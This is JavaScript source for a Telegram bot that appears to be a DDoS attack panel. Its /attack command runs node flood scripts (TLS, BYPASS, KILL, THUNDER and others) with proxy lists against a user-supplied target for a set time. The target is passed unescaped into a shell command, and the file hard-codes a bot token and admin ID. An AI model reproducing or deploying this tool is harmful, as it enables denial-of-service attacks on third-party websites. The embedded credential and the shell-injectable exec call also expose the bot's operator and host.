const { Telegraf } = require('telegraf');
const { exec } = require('child_process');

// Token bot
const bot = new Telegraf('6696728085:AAGlKnOK8aFNKiIU-icZTvLIAt43bDSkAaU');

// ID admin
const adminIds = ['5978972451'];

// Pengguna yang diizinkan
const allowedUsers = [];

// Fungsi untuk memeriksa apakah pengguna adalah admin
function isAdmin(ctx) {
  const userId = ctx.message.from.id.toString();
  return adminIds.includes(userId);
}

// Fungsi untuk memeriksa apakah pengguna diizinkan menggunakan bot
function isUserAllowed(ctx) {
  return allowedUsers.includes(ctx.message.from.username);
}

// Command /attack [METHODS] target.com [time]
bot.command('attack', (ctx) => {
  if (!isAdmin(ctx)) {
    return ctx.reply('You are not allowed to use this command.');
  }

  const commandParams = ctx.message.text.split(' ');
  const method = commandParams[1];
  const target = commandParams[2];
  const time = commandParams[3];

  // Check if method is valid
  if (!['TLS', 'BYPASS', 'EXE', 'THUNDER', 'MIX', 'KILL', 'ESIC', 'HTTP', 'TLS2'].includes(method)) {
    return ctx.reply('Invalid method. Please choose one of TLS, BYPASS, EXE, THUNDER, MIX, KILL, ESIC, HTTP, TLS2.');
  }

  // Check if time is valid
  if (![30, 60, 120, 180, 200].includes(parseInt(time))) {
    return ctx.reply('Invalid time. Please choose either 30, 60, 120, 180, or 200.');
  }

  // Construct attack information message
  const attackInfo = `
Attack sent!!
  `;

  // Execute attack
  const command = getCommand(method, target, time);
  // Execute the command
  executeCommand(command);

  // Send attack information message
  return ctx.replyWithMarkdown(attackInfo);
});

// Command /methods
bot.command('methods', (ctx) => {
  return ctx.reply('Available methods:\nTLS\nBYPASS\nEXE\nTHUNDER\nMIX\nKILL\nESIC\nHTTP\nTLS2');
});

// Command /info
bot.command('info', (ctx) => {
  return ctx.reply('YANG BUAT GMFR444X');
});

// Command /myrun
bot.command('myrun', (ctx) => {
  // Check if attack is running
  // Check if attack is still running based on the time set
  // return status
  return ctx.reply('Attack status: Running / Not Running');
});

// Command /add untuk menambah pengguna
bot.command('add', (ctx) => {
  if (!isAdmin(ctx)) {
    return ctx.reply('Hanya admin yang bisa menggunakan perintah ini.');
  }
  const username = ctx.message.text.split(' ')[1];
  if (!username) {
    return ctx.reply('Silakan berikan nama pengguna.');
  }
  allowedUsers.push(username);
  return ctx.reply(`${username} telah ditambahkan.`);
});

// Command /delete untuk menghapus pengguna
bot.command('delete', (ctx) => {
  if (!isAdmin(ctx)) {
    return ctx.reply('Hanya admin yang bisa menggunakan perintah ini.');
  }
  const username = ctx.message.text.split(' ')[1];
  if (!username) {
    return ctx.reply('Silakan berikan nama pengguna.');
  }
  const index = allowedUsers.indexOf(username);
  if (index !== -1) {
    allowedUsers.splice(index, 1);
    return ctx.reply(`${username} telah dihapus.`);
  } else {
    return ctx.reply(`${username} tidak ada dalam daftar yang diizinkan.`);
  }
});

// Command /help untuk menampilkan bantuan
bot.command('help', (ctx) => {
  const helpMessage = `
  
╭╮╭╮╭┳━━━┳╮╱╱╭━━━┳━━━┳━╮╭━┳━━━╮╭━━━━┳━━━╮╭━━━┳━━━┳━╮╱╭┳━━━┳╮╱╱╱╭━━╮╭━━━┳━━━━╮╭━━━━┳━━━┳╮╱╱╭━━━╮
┃┃┃┃┃┃╭━━┫┃╱╱┃╭━╮┃╭━╮┃┃╰╯┃┃╭━━╯┃╭╮╭╮┃╭━╮┃┃╭━╮┃╭━╮┃┃╰╮┃┃╭━━┫┃╱╱╱┃╭╮┃┃╭━╮┃╭╮╭╮┃┃╭╮╭╮┃╭━━┫┃╱╱┃╭━━╯
┃┃┃┃┃┃╰━━┫┃╱╱┃┃╱╰┫┃╱┃┃╭╮╭╮┃╰━━╮╰╯┃┃╰┫┃╱┃┃┃╰━╯┃┃╱┃┃╭╮╰╯┃╰━━┫┃╱╱╱┃╰╯╰┫┃╱┃┣╯┃┃╰╯╰╯┃┃╰┫╰━━┫┃╱╱┃╰━━╮
┃╰╯╰╯┃╭━━┫┃╱╭┫┃╱╭┫┃╱┃┃┃┃┃┃┃╭━━╯╱╱┃┃╱┃┃╱┃┃┃╭━━┫╰━╯┃┃╰╮┃┃╭━━┫┃╱╭╮┃╭━╮┃┃╱┃┃╱┃┃╱╱╱╱┃┃╱┃╭━━┫┃╱╭┫╭━━╯
╰╮╭╮╭┫╰━━┫╰━╯┃╰━╯┃╰━╯┃┃┃┃┃┃╰━━╮╱╱┃┃╱┃╰━╯┃┃┃╱╱┃╭━╮┃┃╱┃┃┃╰━━┫╰━╯┃┃╰━╯┃╰━╯┃╱┃┃╱╱╱╱┃┃╱┃╰━━┫╰━╯┃╰━━╮
╱╰╯╰╯╰━━━┻━━━┻━━━┻━━━┻╯╰╯╰┻━━━╯╱╱╰╯╱╰━━━╯╰╯╱╱╰╯╱╰┻╯╱╰━┻━━━┻━━━╯╰━━━┻━━━╯╱╰╯╱╱╱╱╰╯╱╰━━━┻━━━┻━━━╯
╭━━┳╮╱╱╭╮╭━━━┳━╮╭━┳━━━┳━━━┳╮╱╭┳╮╱╭┳╮╱╭┳━╮╭━╮
┃╭╮┃╰╮╭╯┃┃╭━╮┃┃╰╯┃┃╭━━┫╭━╮┃┃╱┃┃┃╱┃┃┃╱┃┣╮╰╯╭╯
┃╰╯╰╮╰╯╭╯┃┃╱╰┫╭╮╭╮┃╰━━┫╰━╯┃╰━╯┃╰━╯┃╰━╯┃╰╮╭╯
┃╭━╮┣╮╭╯╱┃┃╭━┫┃┃┃┃┃╭━━┫╭╮╭┻━━╮┣━━╮┣━━╮┃╭╯╰╮
┃╰━╯┃┃┃╱╱┃╰┻━┃┃┃┃┃┃┃╱╱┃┃┃╰╮╱╱┃┃╱╱┃┃╱╱┃┣╯╭╮╰╮
╰━━━╯╰╯╱╱╰━━━┻╯╰╯╰┻╯╱╱╰╯╰━╯╱╱╰╯╱╱╰╯╱╱╰┻━╯╰━╯
 
░░▄▀ ▄▀█ ▀█▀ ▀█▀ ▄▀█ █▀▀ █▄▀   █▀ █▀▄▀█ █▀▀ ▀█▀ █░█ █▀█ █▀▄ █▀ ▀█
▄▀░░ █▀█ ░█░ ░█░ █▀█ █▄▄ █░█   █▄ █░▀░█ ██▄ ░█░ █▀█ █▄█ █▄▀ ▄█ ▄█

▀█▀ ▄▀█ █▀█ █▀▀ █▀▀ ▀█▀ ░ █▀▀ █▀█ █▀▄▀█   █▀ ▀█▀ █ █▀▄▀█ █▀▀ ▀█   ▄▄
░█░ █▀█ █▀▄ █▄█ ██▄ ░█░ ▄ █▄▄ █▄█ █░▀░█   █▄ ░█░ █ █░▀░█ ██▄ ▄█   ░░

█▀▄▀█ █▀▀ █░░ █░█ █▄░█ █▀▀ █░█ █▀█ █▄▀ ▄▀█ █▄░█
█░▀░█ ██▄ █▄▄ █▄█ █░▀█ █▄▄ █▄█ █▀▄ █░█ █▀█ █░▀█

█▀ █▀▀ █▀█ ▄▀█ █▄░█ █▀▀ ▄▀█ █▄░█
▄█ ██▄ █▀▄ █▀█ █░▀█ █▄█ █▀█ █░▀█

█▀▄▀█ █▀▀ █▄░█ █▀▀ █▀▀ █░█ █▄░█ ▄▀█ █▄▀ ▄▀█ █▄░█   █▀▄▀█ █▀▀ ▀█▀ █▀█ █▀▄
█░▀░█ ██▄ █░▀█ █▄█ █▄█ █▄█ █░▀█ █▀█ █░█ █▀█ █░▀█   █░▀░█ ██▄ ░█░ █▄█ █▄▀

▀█▀ █▀▀ █▀█ ▀█▀ █▀▀ █▄░█ ▀█▀ █░█   █▄▀ █▀▀   ▀█▀ ▄▀█ █▀█ █▀▀ █▀▀ ▀█▀
░█░ ██▄ █▀▄ ░█░ ██▄ █░▀█ ░█░ █▄█   █░█ ██▄   ░█░ █▀█ █▀▄ █▄█ ██▄ ░█░

█▄█ ▄▀█ █▄░█ █▀▀   █▀▄ █ ▀█▀ █▀▀ █▄░█ ▀█▀ █░█ █▄▀ ▄▀█ █▄░█
░█░ █▀█ █░▀█ █▄█   █▄▀ █ ░█░ ██▄ █░▀█ ░█░ █▄█ █░█ █▀█ █░▀█

█▀▄ ▄▀█ █░░ ▄▀█ █▀▄▀█   █░█░█ ▄▀█ █▄▀ ▀█▀ █░█
█▄▀ █▀█ █▄▄ █▀█ █░▀░█   ▀▄▀▄▀ █▀█ █░█ ░█░ █▄█

▀█▀ █▀▀ █▀█ ▀█▀ █▀▀ █▄░█ ▀█▀ █░█ ░
░█░ ██▄ █▀▄ ░█░ ██▄ █░▀█ ░█░ █▄█ ▄

░░▄▀ █▀▄▀█ █▀▀ ▀█▀ █░█ █▀█ █▀▄ █▀   ▄▄
▄▀░░ █░▀░█ ██▄ ░█░ █▀█ █▄█ █▄▀ ▄█   ░░

█▀▄▀█ █▀▀ █▄░█ ▄▀█ █▀▄▀█ █▀█ █ █░░ █▄▀ ▄▀█ █▄░█   █▀▄ ▄▀█ █▀▀ ▀█▀ ▄▀█ █▀█
█░▀░█ ██▄ █░▀█ █▀█ █░▀░█ █▀▀ █ █▄▄ █░█ █▀█ █░▀█   █▄▀ █▀█ █▀░ ░█░ █▀█ █▀▄

█▀▄▀█ █▀▀ ▀█▀ █▀█ █▀▄ █▀▀   █▄█ ▄▀█ █▄░█ █▀▀
█░▀░█ ██▄ ░█░ █▄█ █▄▀ ██▄   ░█░ █▀█ █░▀█ █▄█

▀█▀ █▀▀ █▀█ █▀ █▀▀ █▀▄ █ ▄▀█ ░
░█░ ██▄ █▀▄ ▄█ ██▄ █▄▀ █ █▀█ ▄

░░▄▀ █ █▄░█ █▀▀ █▀█   ▄▄   █▀▄▀█ █▀▀ █▄░█ ▄▀█ █▀▄▀█ █▀█ █ █░░ █▄▀ ▄▀█ █▄░█
▄▀░░ █ █░▀█ █▀░ █▄█   ░░   █░▀░█ ██▄ █░▀█ █▀█ █░▀░█ █▀▀ █ █▄▄ █░█ █▀█ █░▀█

█ █▄░█ █▀▀ █▀█ █▀█ █▀▄▀█ ▄▀█ █▀ █   █▀█ █▀▀ █▀▄▀█ █▄▄ █░█ ▄▀█ ▀█▀
█ █░▀█ █▀░ █▄█ █▀▄ █░▀░█ █▀█ ▄█ █   █▀▀ ██▄ █░▀░█ █▄█ █▄█ █▀█ ░█░

█▄▄ █▀█ ▀█▀ ░
█▄█ █▄█ ░█░ ▄

░░▄▀ █▀▄▀█ █▄█ █▀█ █░█ █▄░█   ▄▄   █▀▄▀█ █▀▀ █▀▄▀█ █▀▀ █▀█ █ █▄▀ █▀ ▄▀█
▄▀░░ █░▀░█ ░█░ █▀▄ █▄█ █░▀█   ░░   █░▀░█ ██▄ █░▀░█ ██▄ █▀▄ █ █░█ ▄█ █▀█

█▀ ▀█▀ ▄▀█ ▀█▀ █░█ █▀   █▀ █▀▀ █▀█ ▄▀█ █▄░█ █▀▀ ▄▀█ █▄░█
▄█ ░█░ █▀█ ░█░ █▄█ ▄█   ▄█ ██▄ █▀▄ █▀█ █░▀█ █▄█ █▀█ █░▀█

█▄█ ▄▀█ █▄░█ █▀▀   █▀ █▀▀ █▀▄ ▄▀█ █▄░█ █▀▀
░█░ █▀█ █░▀█ █▄█   ▄█ ██▄ █▄▀ █▀█ █░▀█ █▄█

█▄▄ █▀▀ █▀█ █░░ ▄▀█ █▄░█ █▀▀ █▀ █░█ █▄░█ █▀▀ ░
█▄█ ██▄ █▀▄ █▄▄ █▀█ █░▀█ █▄█ ▄█ █▄█ █░▀█ █▄█ ▄

░░▄▀ ▄▀█ █▀▄ █▀▄
▄▀░░ █▀█ █▄▀ █▄▀

█▀ █▄░█ ▄▀█ █▀▄▀█ ▄▀█ █▀█ █▀▀ █▄░█ █▀▀ █▀▀ █░█ █▄░█ ▄▀█ ▀█   ▄▄
█▄ █░▀█ █▀█ █░▀░█ █▀█ █▀▀ ██▄ █░▀█ █▄█ █▄█ █▄█ █░▀█ █▀█ ▄█   ░░

█▀▄▀█ █▀▀ █▄░█ ▄▀█ █▀▄▀█ █▄▄ ▄▀█ █░█ █▄▀ ▄▀█ █▄░█
█░▀░█ ██▄ █░▀█ █▀█ █░▀░█ █▄█ █▀█ █▀█ █░█ █▀█ █░▀█

█▀█ █▀▀ █▄░█ █▀▀ █▀▀ █░█ █▄░█ ▄▀█   █▄█ ▄▀█ █▄░█ █▀▀
█▀▀ ██▄ █░▀█ █▄█ █▄█ █▄█ █░▀█ █▀█   ░█░ █▀█ █░▀█ █▄█

█▀▄ █ █ ▀█ █ █▄░█ █▄▀ ▄▀█ █▄░█
█▄▀ █ █ █▄ █ █░▀█ █░█ █▀█ █░▀█

█▀▄▀█ █▀▀ █▄░█ █▀▀ █▀▀ █░█ █▄░█ ▄▀█ █▄▀ ▄▀█ █▄░█   █▄▄ █▀█ ▀█▀ ░
█░▀░█ ██▄ █░▀█ █▄█ █▄█ █▄█ █░▀█ █▀█ █░█ █▀█ █░▀█   █▄█ █▄█ ░█░ ▄

░░▄▀ █▀▄ █▀▀ █░░ █▀▀ ▀█▀ █▀▀
▄▀░░ █▄▀ ██▄ █▄▄ ██▄ ░█░ ██▄

█▀ █▄░█ ▄▀█ █▀▄▀█ ▄▀█ █▀█ █▀▀ █▄░█ █▀▀ █▀▀ █░█ █▄░█ ▄▀█ ▀█   ▄▄
█▄ █░▀█ █▀█ █░▀░█ █▀█ █▀▀ ██▄ █░▀█ █▄█ █▄█ █▄█ █░▀█ █▀█ ▄█   ░░

█▀▄▀█ █▀▀ █▄░█ █▀▀ █░█ ▄▀█ █▀█ █░█ █▀   █▀█ █▀▀ █▄░█ █▀▀ █▀▀ █░█ █▄░█ ▄▀█
█░▀░█ ██▄ █░▀█ █▄█ █▀█ █▀█ █▀▀ █▄█ ▄█   █▀▀ ██▄ █░▀█ █▄█ █▄█ █▄█ █░▀█ █▀█

█▀▄ ▄▀█ █▀█ █   █▀▄ ▄▀█ █▀▀ ▀█▀ ▄▀█ █▀█   █▄█ ▄▀█ █▄░█ █▀▀
█▄▀ █▀█ █▀▄ █   █▄▀ █▀█ █▀░ ░█░ █▀█ █▀▄   ░█░ █▀█ █░▀█ █▄█

█▀▄ █ █ ▀█ █ █▄░█ █▄▀ ▄▀█ █▄░█ ░
█▄▀ █ █ █▄ █ █░▀█ █░█ █▀█ █░▀█ ▄

░░▄▀ █░█ █▀▀ █░░ █▀█   ▄▄   █▀▄▀█ █▀▀ █▄░█ ▄▀█ █▀▄▀█ █▀█ █ █░░ █▄▀ ▄▀█ █▄░█
▄▀░░ █▀█ ██▄ █▄▄ █▀▀   ░░   █░▀░█ ██▄ █░▀█ █▀█ █░▀░█ █▀▀ █ █▄▄ █░█ █▀█ █░▀█

█▄▄ ▄▀█ █▄░█ ▀█▀ █░█ ▄▀█ █▄░█   █ █▄░█ █ ░
█▄█ █▀█ █░▀█ ░█░ █▄█ █▀█ █░▀█   █ █░▀█ █ ▄
 
  `;
  return ctx.replyWithMarkdown(helpMessage);
});

// Function to check if user is admin
function isAdmin(ctx) {
  return adminIds.includes(ctx.message.from.id.toString());
}

// Function to check if user is allowed to use bot
function isUserAllowed(ctx) {
  return allowedUsers.includes(ctx.message.from.username);
}

// Function to get the command based on the method
function getCommand(method, url, time) {
  let command = '';
  if (method === 'HTTP') {
    command = `node HTTP-RAW.js ${url} ${time}`;
  } else if (method === 'TLS') {
    command = `node TLS-SILIT.js ${url} ${time} 64 10 proxy.txt`;
  } else if (method === 'THUNDER') {
    command = `node thunder.js ${url} ${time} 10 15 proxy.txt 1`;
  } else if (method === 'KILL') {
    command = `node kill.js ${url} ${time} 512 10 `;
  } else if (method === 'ESIC') {
    command = `node ESIC.js ${url} ${time} 64 10 proxy.txt`;
  } else if (method === 'TLS2') {
    command = `node TLS-SILITv3.js ${url} ${time} 64 10 proxy.txt`;
  } else if (method === 'MIX') {
    command = `node MIX-SYN.js ${url} 18 ${time}`;
  } else if (method === 'EXE') {
    command = `node LXE.js ${url} ${time} 64 10 proxy.txt`;
  } else if (method === 'BYPASS') {
    command = `node BYPASS-SILIT.js ${url} ${time} 64 10 proxy.txt`;
  }
  return command;
}

// Function to execute the command
function executeCommand(command) {
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`exec error: ${error}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);
  });
}

bot.launch();
